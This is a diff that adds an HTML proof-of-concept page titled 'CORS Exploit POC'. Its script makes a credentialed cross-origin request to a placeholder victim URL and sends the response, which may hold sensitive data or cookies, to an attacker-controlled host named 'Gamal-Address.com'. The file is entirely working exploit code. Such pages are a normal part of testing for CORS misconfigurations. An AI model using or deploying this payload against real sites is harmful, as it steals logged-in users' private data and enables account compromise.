@@ -1,0 +1,19 @@
+<html>
+	<body>
+		<h1>CORS Exploit POC</h1>
+		<script>
+			var cors = new XMLHttpRequest();
+			var Victim = 'https://Victim.com/SensitiveInfoInRespOr4Cookie';
+			cors.onload = reqListener;
+			cors.open('get', Victim, true);
+			cors.withCredentials = true;
+			cors.send();
+			function reqListener() {
+				var data = new XMLHttpRequest();
+				var attacker = 'https://Gamal-Address.com' + encodeURIComponent(String(this.responseText));
+				data.open('GET', attacker);
+				data.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
+			};
+		</script>
+	</body>
+</html>
